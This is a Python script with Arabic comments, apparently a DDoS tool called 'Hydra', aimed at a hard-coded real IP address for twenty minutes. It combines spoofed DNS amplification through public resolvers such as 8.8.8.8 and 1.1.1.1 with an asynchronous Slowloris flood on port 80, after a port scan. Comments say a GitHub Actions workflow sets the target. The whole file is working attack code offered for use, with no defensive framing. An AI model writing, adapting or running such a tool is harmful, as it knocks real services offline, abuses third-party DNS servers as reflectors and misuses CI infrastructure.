import asyncio
import socket
import random
import sys
import os
from scapy.all import IP, UDP, DNS, DNSQR, send
import aiodns

# --- لوحة التحكم ---
# سيتم تعديل هذه القيم تلقائيًا بواسطة GitHub Actions workflow
TARGET_IP = "63.246.154.12"
DURATION = 1200  # 1200 ثانية = 20 دقيقة
AMPLIFICATION_FACTOR = 2000 # عدد حزم التضخيم المرسلة في كل دورة

# قائمة خوادم DNS عامة لاستخدامها في هجوم التضخيم
DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "208.67.222.222", "208.67.220.220"
]

# --- متغيرات التحكم ---
stop_event = asyncio.Event()

# --- الناقل الأول: هجوم تضخيم DNS (DNS Amplification) ---
async def dns_amplification_attack():
    print("[+] تفعيل ناقل التضخيم: DNS Amplification...")
    while not stop_event.is_set():
        try:
            # إرسال حزم DNS إلى خوادم بريئة مع انتحال IP الهدف
            packet = IP(src=TARGET_IP, dst=random.choice(DNS_SERVERS)) / \
                     UDP(sport=random.randint(1025, 65500), dport=53) / \
                     DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
            
            # إرسال دفعة من الحزم بكفاءة عالية
            send(packet, count=AMPLIFICATION_FACTOR, verbose=0)
            await asyncio.sleep(0.1) # إعطاء فرصة لباقي المهام
        except Exception as e:
            print(f"[!] خطأ في ناقل التضخيم: {e}")

# --- الناقل الثاني: هجوم Slowloris غير المتزامن ---
async def async_slowloris_attack(num_sockets=1500):
    print(f"[+] تفعيل ناقل الاستنزاف: Asynchronous Slowloris...")
    sockets = []

    async def create_socket():
        try:
            reader, writer = await asyncio.open_connection(TARGET_IP, 80)
            writer.write(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode())
            await writer.drain()
            return writer
        except Exception:
            return None

    sockets = [await create_socket() for _ in range(num_sockets)]
    sockets = [s for s in sockets if s is not None] # إزالة الاتصالات الفاشلة

    while not stop_event.is_set():
        print(f"\r[+] عدد اتصالات Slowloris الحية: {len(sockets)}   ", end="")
        try:
            # إبقاء الاتصالات حية
            for writer in list(sockets):
                try:
                    writer.write(f"X-a: {random.randint(1, 9999)}\r\n".encode())
                    await writer.drain()
                except Exception:
                    sockets.remove(writer)
            
            # إعادة إنشاء الاتصالات الميتة
            needed = num_sockets - len(sockets)
            new_sockets = [await create_socket() for _ in range(needed)]
            sockets.extend([s for s in new_sockets if s is not None])
            
            await asyncio.sleep(10)
        except Exception:
            pass

# --- فاحص المنافذ الأولي ---
async def initial_port_scan():
    print("[INFO] بدء الفحص الأولي للمنافذ على الهدف...")
    open_ports = []
    try:
        # فحص المنافذ الشائعة
        tasks = {
            80: "HTTP", 443: "HTTPS", 53: "DNS", 22: "SSH", 21: "FTP"
        }
        for port, service in tasks.items():
            try:
                await asyncio.wait_for(asyncio.open_connection(TARGET_IP, port), timeout=1.0)
                print(f"[SUCCESS] المنفذ {port} ({service}) مفتوح.")
                open_ports.append(port)
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                pass
    except Exception as e:
        print(f"[ERROR] فشل فحص المنافذ: {e}")
    return open_ports

# --- الدالة الرئيسية لتشغيل Hydra ---
async def main():
    print("="*60)
    print("         Hydra - Asynchronous & Reflective Attack Core")
    print("="*60)
    print(f"[INFO] الهدف: {TARGET_IP}")
    print(f"[INFO] المدة: {DURATION} ثانية")

    open_ports = await initial_port_scan()
    active_tasks = []

    if not open_ports:
        print("[WARNING] لم يتم العثور على منافذ مفتوحة. سيتم التركيز على هجوم التضخيم فقط.")
    
    # تفعيل ناقل التضخيم دائمًا (لا يحتاج لمنفذ مفتوح على الهدف)
    active_tasks.append(asyncio.create_task(dns_amplification_attack()))

    # تفعيل ناقل Slowloris إذا كان منفذ 80 مفتوحًا
    if 80 in open_ports:
        active_tasks.append(asyncio.create_task(async_slowloris_attack()))
    
    if not active_tasks:
        print("[ERROR] لا يمكن بدء أي ناقل هجومي. البرنامج سينتهي.")
        return

    print("[SUCCESS] تم تفعيل جميع النواقل الهجومية. Hydra يعمل الآن.")
    
    try:
        await asyncio.sleep(DURATION)
    except asyncio.CancelledError:
        print("\n[!] تم طلب الإيقاف يدويًا.")
    finally:
        stop_event.set()
        print("\n[INFO] إرسال إشارة الإيقاف... جاري إنهاء المهام...")
        # انتظر قليلاً للسماح للمهام بالانتهاء
        await asyncio.sleep(2)
        print("[SUCCESS] الهجوم انتهى. Hydra يعود إلى سباته.")
        print("="*60)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[ERROR] Hydra يتطلب صلاحيات root لتزييف الحزم. الرجاء تشغيله باستخدام 'sudo'.")
        sys.exit(1)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
